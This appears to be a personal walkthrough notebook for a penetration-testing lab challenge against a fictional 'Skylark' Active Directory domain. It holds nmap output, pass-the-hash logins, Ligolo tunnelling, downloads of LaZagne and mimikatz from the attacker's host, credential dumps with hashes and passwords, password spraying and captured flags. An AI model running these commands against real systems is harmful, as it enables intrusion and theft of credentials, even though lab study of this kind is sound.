				SKYLARK
-----------------------------------------------------------------------------------------
Please note that this challenge is significantly more difficult than Challenges 1 & 2. It requires a substantial amount of pivoting, tunneling, looking for information on multiple targets and paying close attention to post-exploitation. It is beyond the scope of the OSCP exam. If preparing for the exam is your main objective, you may wish to work through Challenges 4, 5 & 6 before returning to this one. Good luck!

Skylark Industries is an aerospace multinational corporation that performs research & development on cutting-edge aviation technologies. One of their major branch office has been recently targeted by an Advanced Threat Actor (APT) ransomware attack. For this reason, the company CISO is now urging to further shield Skylark Industries' attack surface. We have so been tasked to conduct a preemptive penetration test towards their HQ infrastructure and find any vulnerability that could potentially jeopardize the company's trade secrets.

The organization topology diagram is shown below and the public subnet network resides in the 192.168.xx.0/24 range, where the xx of the third octet can be found under the IP ADDRESS field in the control panel.

-----------------------------------------------------------------------------------------
                                # IPS:
# INTERNAL:
10.10.114.11	Challenge 3 - VM 0 OS âœ…
10.10.114.250 	Challenge 3 - VM 1 OS âœ…
10.10.114.10	Challenge 3 - VM 2 OS âœ…
10.10.114.12	Challenge 3 - VM 3 OS
10.10.114.13	Challenge 3 - VM 4 OS âœ…
10.20.114.14	Challenge 3 - VM 5 OS
10.20.114.15	Challenge 3 - VM 6 OS
10.20.114.110	Challenge 3 - VM 7 OS
10.20.114.111	Challenge 3 - VM 8 OS
172.16.154.30	Challenge 3 - VM 9 OS
172.16.154.31	Challenge 3 - VM 10 OS
172.16.154.32	Challenge 3 - VM 19 OS

# WINPREP:
192.168.154.250	Challenge 3 - WINPREP OS Credentials: offsec / lab

# EXTERNAL:
192.168.154.220	Challenge 3 - VM 11 OS âœ…
192.168.154.221	Challenge 3 - VM 12 OS âœ…
192.168.154.222	Challenge 3 - VM 13 OS
192.168.154.223	Challenge 3 - VM 14 OS âœ…
192.168.154.224	Challenge 3 - VM 15 OS
192.168.154.225	Challenge 3 - VM 16 OS âœ…
192.168.154.226	Challenge 3 - VM 17 OS
192.168.154.227	Challenge 3 - VM 18 OS

-----------------------------------------------------------------------------------------
				INTERNAL IPS:
-----------------------------------------------------------------------------------------
		10.10.190.11	Challenge 3 - VM 0 OS âœ…

				ACCESS:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:17add237f30abaecc9d884f72958b928:::
Nthash: 17add237f30abaecc9d884f72958b928
Login: Administrator

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:17add237f30abaecc9d884f72958b928 Administrator@192.168.208.221

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 192.168.183.221 -u Administrator -H 17add237f30abaecc9d884f72958b928


				PORT FORWARD: Ligolo
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

python3 -m http.server 80
iwr -uri http://192.168.45.215:80/agent.exe -Outfile agent.exe
.\agent.exe -connect 192.168.45.215:11601 -ignore-cert

session 
1
ipconfig
10.10.185.254

sudo ip route add 10.10.143.0/24 dev ligolo
start


				NMAP: 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.190.11

HTTP: 5985 47001
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

RPC: 135
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

SMB: 139 445
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| smb2-time: 
|   date: 2024-05-17T04:24:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: LAB, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:54:ab (VMware)
| Names:
|   LAB<00>              Flags: <unique><active>
|   LAB<20>              Flags: <unique><active>
|   SKYLARK<00>          Flags: <group><active>
| Statistics:
|   00:50:56:ab:54:ab:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36932/tcp): CLEAN (Timeout)
|   Check 2 (port 9920/tcp): CLEAN (Timeout)
|   Check 3 (port 23725/udp): CLEAN (Timeout)
|   Check 4 (port 22980/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -2s


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.10.190.11

PORT    STATE SERVICE
137/udp open  netbios-ns
Device type: game console
Running: Nintendo embedded
OS CPE: cpe:/h:nintendo:wii
OS details: Nintendo Wii game console


				HTTP: 5985 47001
http://10.10.190.11:5985
http://10.10.190.11:47001
Not Found
HTTP Error 404. The requested resource is not found.


				SMB: 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-smbclient kiosk@10.10.190.11
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
XEwUS^9R2Gwt8O914

# shares
ADMIN$
backup
C$
IPC$

# use ADMIN$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

# use C$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

# use backup
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

# use IPC$


				ACCESS:
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:17add237f30abaecc9d884f72958b928 Administrator@10.10.185.11
[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 10.10.185.11 -u Administrator -H 17add237f30abaecc9d884f72958b928


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec backup_service:It4Server@10.10.185.11 cmd.exe

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 10.10.209.11 -u backup_service -p It4Server


C:\Users\Administrator\Desktop> whoami
nt authority\system

C:\Users\Administrator\Desktop> hostname
lab


				Proof.txt
C:\Users> dir
 Directory of C:\Users
11/21/2022  07:51 AM    <DIR>          .
11/16/2022  02:21 AM    <DIR>          Administrator
11/21/2022  07:51 AM    <DIR>          administrator.SKYLARK
11/16/2022  02:21 AM    <DIR>          Public


C:\Users\Administrator\Desktop> dir
 Directory of C:\Users\Administrator\Desktop
05/17/2024  12:17 AM    <DIR>          .
11/16/2022  02:21 AM    <DIR>          ..
05/17/2024  12:17 AM                34 proof.txt

C:\Users\Administrator\Desktop> type proof.txt
08ef670f3e4e4fe551db287190b1d409


				CREDS: 
C:\Users\Administrator\Desktop> net users /domain 
The request will be processed at a domain controller for domain SKYLARK.com.
User accounts for \\dc.SKYLARK.com
Administrator            backup_service           baop__user               
d.johnson                f.miller                 Guest                    
helpdesk_setup           j.jameson                j.jones                  
k.kelley                 k.smith                  kiosk                    
krbtgt                   l.nguyen                 n.engels                 
print_service            s.ahmed    


# LaZagne: 
*Evil-WinRM* PS C:\Users\backup_service\Documents> iwr -uri http://192.168.45.175:80/LaZagne.exe -Outfile laz.exe
*Evil-WinRM* PS C:\Users\backup_service\Documents> .\laz.exe all
[+] System masterkey decrypted for 685f4dbb-b5b2-4912-968e-84da5495ba65
[+] System masterkey decrypted for 68c71ae3-1b43-4dae-b2e4-139d7afc7342
[+] System masterkey decrypted for 97652566-7934-4c39-bc94-07c8afab25a5
[+] System masterkey decrypted for e584b211-eaca-4d78-b9e0-4b6ddd9aba07
########## User: SYSTEM ##########
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c4468acfbf7d29c74c590b01282f88d3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5e202c82579c8a0f6c87716b36566d72:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: cc1ed1ff5033856e82274fae536f9042932a23d0
Nthash: 00c0a9232ef1a0a43d78f2f946a531ce
Login: LAB$
[+] Shahash found !!!
Shahash: 9589af1c48753335126e4be90447c1f3ae2d873f
Nthash: c4468acfbf7d29c74c590b01282f88d3
Login: Administrator
------------------- Lsa_secrets passwords -----------------
$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   FD 6D 3D 0B 39 AF A8 BB 84 17 75 48 73 5B 30 E8    .m=.9.....uHs[0.
0020   8B C0 86 E2 F6 35 39 9C 3B F6 89 19 5C 1D A5 D7    .....59.;.......
0030   D7 E8 20 92 99 E2 F8 1C 6E 21 15 87 AA 82 7B 23    .. .....n!....{#
0040   33 39 A3 0E E8 B8 D8 33 54 05 0D FF C6 A8 47 40    39.....3T.....G@
0050   9E 88 A8 74 49 8E 25 29 96 B2 A9 76 0D EF FD 8F    ...tI.%)...v....
0060   D9 C6 32 FC 24 FC F6 BC DA C3 E5 DF D7 7C DF 68    ..2.$........|.h
0070   E8 95 DC BC 55 EF 09 CB B0 39 C6 7D B8 D1 44 77    ....U....9.}..Dw
0080   E0 D3 FC 61 8D 1E 9B 5D A1 CC 56 32 DF A6 1B 47    ...a...]..V2...G
0090   99 29 74 A0 6F 04 4B 7D 84 6B F1 2E EB B0 42 2D    .)t.o.K}.k....B-
00A0   4C 0F 09 18 EB 66 C6 7A 8F B1 BE F1 AF 19 3B 3B    L....f.z......;;
00B0   24 99 D9 9F 60 EE 11 B2 1E 1D 4B 0C 00 AA E6 E5    $...`.....K.....
00C0   E4 C5 21 1F 6E CE BA 1E 70 4D 78 49 75 65 A5 42    ..!.n...pMxIue.B
00D0   CF 2D 62 7F 79 5B A8 1E BF 52 BA D5 CC 7B CC FD    .-b.y[...R...{..
00E0   22 63 09 77 41 F5 8A 63 E2 4C E4 C3 FA 53 99 5D    "c.wA..c.L...S.]
00F0   08 D3 70 6E D1 FE FE 44 00 0C F4 81 48 41 B0 49    ..pn...D....HA.I
0100   43 74 B1 19 A6 2C EB D0 53 10 86 91 3F 14 34 C0    Ct...,..S...?.4.
DefaultPassword
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   6F F9 86 7E 72 43 B8 01 84 A6 99 A9 3C 4C 03 EB    o..~rC......<L..
DPAPI_SYSTEM
0000   01 00 00 00 8E 81 04 BC 3F A9 15 DD 3C 64 80 BA    ........?...<d..
0010   08 B2 AE 9B 7B F9 05 B6 15 32 8A 45 91 4D C0 9D    ....{....2.E.M..
0020   75 C7 9F 2B 81 D0 D9 18 E7 64 30 05                u..+.....d0.
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   13 DD 12 CC 37 D4 B6 4A 0C FC 93 0E 54 B6 E2 6E    ....7..J....T..n
0020   C6 ED 7E 40 52 0E 31 83 1B 0C 3C A9 B9 55 02 CC    ..~@R.1...<..U..
0030   28 AE E7 4C 22 65 12 E3 DC FC 66 DE 38 31 CA F2    (..L"e....f.81..
0040   D5 CD 38 F7 32 4E 6F 4F 23 DB 8D 6B 9F 4F 9E 65    ..8.2NoO#..k.O.e
0050   50 E4 52 B6 CA F4 76 06 3D B9 14 E9 0D 98 53 67    P.R...v.=.....Sg
[+] 9589af1c48753335126e4be90447c1f3ae2d873f ok for masterkey 6bc5bc3f-8791-4c4b-9571-7c406b63539c
[+] 9589af1c48753335126e4be90447c1f3ae2d873f ok for masterkey ebe678da-8845-414d-83a3-6573a98d7f6c
[+] 2 passwords have been found.


				SPRAY AND PRAY: 

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK]
â””â”€$ sudo crackmapexec winrm 10.10.209.0/24 -u users.txt -p pass.txt --continue-on-success


â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK]
â””â”€$ crackmapexec smb 10.10.209.0/24 -u users.txt -p pass.txt --shares

SMB         10.10.209.11    445    LAB              [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.209.13    445    MAIL             [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.209.250   445    DC               [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.209.240   445    HOUSTON01        [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               
SMB         10.10.209.254   445    AUSTIN02         [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)                                                                                               


â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK]
â””â”€$ impacket-psexec backup_service:It4Server@10.10.185.254 cmd.exe


ftp backup_service@192.168.225.226


-----------------------------------------------------------------------------------------
		10.10.190.250 	Challenge 3 - VM 1 OS âœ…

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.190.250

53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-05-17 04:35:34Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SKYLARK.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SKYLARK.com0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack

3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SKYLARK
|   NetBIOS_Domain_Name: SKYLARK
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: SKYLARK.com
|   DNS_Computer_Name: dc.SKYLARK.com
|   DNS_Tree_Name: SKYLARK.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-17T04:36:34+00:00
| ssl-cert: Subject: commonName=dc.SKYLARK.com
| Issuer: commonName=dc.SKYLARK.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-11T09:26:51
| Not valid after:  2024-10-11T09:26:51
| MD5:   3c85:00f6:7d37:5b21:bc1b:ed38:ee94:6d04
| SHA-1: 7db9:4f37:0aa6:4a90:e068:a8d0:0b3b:10de:0cf4:68bd
|_ssl-date: 2024-05-17T04:37:11+00:00; -2s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
58542/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
58543/tcp open  msrpc         syn-ack Microsoft Windows RPC
58548/tcp open  msrpc         syn-ack Microsoft Windows RPC
58549/tcp open  msrpc         syn-ack Microsoft Windows RPC
58558/tcp open  msrpc         syn-ack Microsoft Windows RPC
58563/tcp open  msrpc         syn-ack Microsoft Windows RPC
58582/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12793/tcp): CLEAN (Timeout)
|   Check 2 (port 49603/tcp): CLEAN (Timeout)
|   Check 3 (port 42852/udp): CLEAN (Timeout)
|   Check 4 (port 7428/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2024-05-17T04:36:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:c6:9d (VMware)
| Names:
|   DC<00>               Flags: <unique><active>
|   DC<20>               Flags: <unique><active>
|   SKYLARK<00>          Flags: <group><active>
|   SKYLARK<1c>          Flags: <group><active>
|   SKYLARK<1b>          Flags: <unique><active>
| Statistics:
|   00:50:56:ab:c6:9d:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 10.10.190.250
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
137/udp open  netbios-ns
389/udp open  ldap
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Rockwell Automation 1761-NET-ENI Ethernet-to-RS-232-C interface module (94%), XigmaNAS (FreeBSD 11.2-RELEASE) (94%), AVM FRITZ!Box FON WLAN 7170 WAP (Linux 2.6.13) (94%), XigmaNAS (FreeBSD 12.2-RELEASE) (94%), Cisco SG 300-10, Dell PowerConnect 2748, Linksys SLM2024, SLM2048, or SLM224P, or Netgear FS728TP or GS724TP switch (94%), Dell PowerConnect 5316M switch (94%), Linksys SRW2000-series or Allied Telesyn AT-8000S switch (94%), Linksys SRW2024 switch (94%), Netgear FS700TS Smart Switch (94%), Blue Coat SGOS 4.2.2.2 (94%)
No exact OS matches for host (test conditions non-ideal).


				250: DC - Pwn3d!
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec backup_service:It4Server@10.10.185.250 cmd.exe

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc

C:\Users\Administrator\Desktop> type proof.txt
015b65040f68f8205964b3722d6dc3aa

PS C:\Users\helpdesk_setup\Desktop> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         5/17/2024  12:16 AM             34 local.txt  

PS C:\Users\helpdesk_setup\Desktop> type C:\local.txt
8d1ed4616f8bab952c4a492bbbd50af3

PS C:\> ls
PS C:\> cat credentials.txt
Local Admin Passwords:
- PARIS: MusingExtraCounty98
- SYDNEY: DowntownAbbey1923



â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 10.10.168.250 -u backup_service -p It4Server



				DUMP CREDS: 
evil-winrm -i 10.10.185.250 -u backup_service -p It4Server 

iwr -uri http://192.168.45.192:80/LaZagne.exe -Outfile laz.exe
*Evil-WinRM* PS C:\Users> .\laz.exe all
[+] System masterkey decrypted for 1e4dd447-1eb6-4a30-b1ec-52768886ac2d
[+] System masterkey decrypted for 4e9ea24d-cdd5-43b2-bb66-ca2a9016dad3
[+] System masterkey decrypted for 94286751-0b16-4f43-a44f-4ecbe351ddf5
[+] System masterkey decrypted for 94d3a384-213f-4878-b731-0cff5448a8da
########## User: SYSTEM ##########
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: abc72084833924d3edf645fbf89457f7019e60db
Nthash: 55375d3c25c50db8a6064014f092646d
Login: Administrator
[+] Shahash found !!!
Shahash: f342823ea4063d045b62b5c665d2cec52322097d
Nthash: f6dabf918323d9f387f8366241b6ab2a
Login: DC$
------------------- Lsa_secrets passwords -----------------
$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   6E 88 1E FA 9F ED 49 AB 9E FA EF ED ED DB 39 42    n.....I.......9B
0020   38 94 75 D8 D8 FE 64 5B 06 12 7A A4 06 9D 95 AD    8.u...d[..z.....
0030   6C 01 B6 02 89 EF 1E 6E AF A2 75 3A 12 8E 30 71    l......n..u:..0q
0040   1E F1 6C C0 A5 2C CF E0 56 57 62 8F B6 9F 24 CE    ..l..,..VWb...$.
0050   03 93 EE 09 A9 5B 43 B6 02 4B FC CC 11 60 57 63    .....[C..K...`Wc
0060   DE 3A 74 6E E9 A2 D6 6A 0A F6 76 5E 15 4B 49 5C    .:tn...j..v^.KI.
0070   CC F9 FB 29 86 23 2E 74 8C 86 A6 2C 10 60 C2 EF    ...).#.t...,.`..
0080   EB 1C 8A CF 52 0D 41 7B EF AE 9E AD D6 9A DC DE    ....R.A{........
0090   50 2B 12 D9 7F 6D 02 35 AB 6A 88 E0 91 1E D0 DC    P+...m.5.j......
00A0   2E B7 B4 F9 C4 5C 43 20 4A 6D C2 01 24 46 91 52    ......C Jm..$F.R
00B0   11 BD 7E 95 74 64 E6 CB 80 9B DE C9 91 24 E4 3D    ..~.td.......$.=
00C0   FE 75 B6 D2 E1 77 CE 5C D3 91 44 BD E9 82 61 EF    .u...w....D...a.
00D0   E1 7D E1 21 7B D9 13 65 58 2C 31 69 A3 B0 F8 B3    .}.!{..eX,1i....
00E0   F8 20 D0 6B AB CD 60 6F 30 2F 82 3B 58 8A 33 2B    . .k..`o0/.;X.3+
00F0   55 F3 28 DC 87 A4 1C E4 75 47 FD 5B 2E A8 F7 15    U.(.....uG.[....
0100   70 35 03 99 8A 89 CA 1F 87 F1 3B D3 AE B2 C9 38    p5........;....8
DPAPI_SYSTEM
0000   01 00 00 00 56 19 36 40 11 91 BF 4D A2 33 CB 13    ....V.6@...M.3..
0010   88 2D 0F E2 A9 A1 E6 79 19 88 70 C8 44 1F 25 70    .-.....y..p.D.%p
0020   ED 88 BF 91 23 8D BE C7 20 1E 2E 2B                ....#... ..+
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   4D 84 B2 B9 CF 36 ED B0 89 D6 5A 1E 50 23 1D F0    M....6....Z.P#..
0020   99 45 58 C2 03 59 09 92 B6 3A 04 4B F0 36 3F DD    .EX..Y...:.K.6?.
0030   59 7F 22 12 AA 1A 2F 47 E1 DF 96 6D A2 6A 85 CD    Y.".../G...m.j..
0040   C3 61 9A 42 D0 22 60 54 24 D6 ED BB 80 98 83 97    .a.B."`T$.......
0050   91 CF BE 60 68 4A 35 1B 13 C7 8A 31 A2 4B 54 81    ...`hJ5....1.KT.
[+] 2 passwords have been found.

*Evil-WinRM* PS C:\Users> (Get-PSReadlineOption).HistorySavePath
C:\Users\backup_service\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt

*Evil-WinRM* PS C:\Users> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
Cannot find path 'C:\Users\backup_service\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt' because it does not exist.

*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> ls 
    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/1/2023   1:38 AM              0 ConsoleHost_history.txt

*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt


# MIMIKATZ
impacket-psexec -hashes 00000000000000000000000000000000:55375d3c25c50db8a6064014f092646d Administrator@10.10.168.250
iwr -uri http://192.168.45.192:80/mimikatz.exe -Outfile mimi.exe
.\mimi.exe
privilege::debug
sekurlsa::logonpasswords

mimikatz # 
Authentication Id : 0 ; 473642 (00000000:00073a2a)
Session           : Batch from 0
User Name         : Administrator
Domain            : SKYLARK
Logon Server      : DC
Logon Time        : 4/12/2024 2:29:19 AM
SID               : S-1-5-21-1292302113-2619340358-1562424167-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SKYLARK
         * NTLM     : 55375d3c25c50db8a6064014f092646d
         * SHA1     : abc72084833924d3edf645fbf89457f7019e60db
         * DPAPI    : a99656a9f57956f973f593d7b26baa0d
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SKYLARK
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : SKYLARK.com
         * Password : E2koUInnHx5_nrAjBouE
        ssp :
        credman :
        cloudap :


			NETWORK: 
*Evil-WinRM* PS C:\> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : dc
   Primary Dns Suffix  . . . . . . . : SKYLARK.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : SKYLARK.com
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-F7-1B
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.168.250(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.168.254
   DNS Servers . . . . . . . . . . . : 10.10.168.250
   NetBIOS over Tcpip. . . . . . . . : Enabled

*Evil-WinRM* PS C:\> arp -A
Interface: 10.10.168.250 --- 0xf
  Internet Address      Physical Address      Type
  10.10.168.10          00-50-56-ab-a8-7e     dynamic
  10.10.168.11          00-50-56-ab-8d-18     dynamic
  10.10.168.12          00-50-56-ab-ea-15     dynamic
  10.10.168.13          00-50-56-ab-e1-21     dynamic
  10.10.168.240         00-50-56-ab-5e-23     dynamic
  10.10.168.254         00-50-56-ab-b4-35     dynamic
  10.10.168.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static


			PRIV ESC: helpdesk_setup

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ evil-winrm -i 10.10.168.250 -u Administrator -H 55375d3c25c50db8a6064014f092646d

*Evil-WinRM* PS C:\Users\Administrator\Documents\Security\Database\Templates> cat vss.inf
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1

*Evil-WinRM* PS C:\Users\Administrator> cat DnsUpdater.ps1


# List of services with binary path
PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName   

PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}


# enumerating the scheduled tasks
*Evil-WinRM* PS C:\> tasklist
*Evil-WinRM* PS C:\> Get-ScheduledTask



Have you found the setup / config file?

Hi sm thanks for the quick response, yes I did, I'm currently the administrator user now, I'm assuming it's that file on C:\Setup 

Ok cool so you know already that there is a task running every few mins, have you tried using responder to see if any comes back to you?

Ahhh, ok  I see scheduled task, so I'm guessing I have to open responder on my kali machine in this case? But ok one question, so I'm supposed to modify the task that from the windows machine such that it will reach my tun0 interface on my kali right? Just to make sure I'm heading towards the right direction! 

If you connected as admin you could try enabling RDP via cmd then accessing it via proxychains, set up responder to monitor tun0 and you should be good after you alter the dir command slightly ðŸ™‚ 


			RDP ACCESS: helpdesk_setup


MAIL should be the last machine in the chain that you need to compromise. 
So your target should be DC.
There is a specific user with server operators group that is allowed to login into DC machines. The access has the permission to start, stop and modify services on the DC

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK]
â””â”€$ netexec rdp 10.10.190.250 -u users.txt -p pass.txt
RDP         10.10.190.250   3389   DC               [+] SKYLARK.com\kiosk:XEwUS^9R2Gwt8O914 
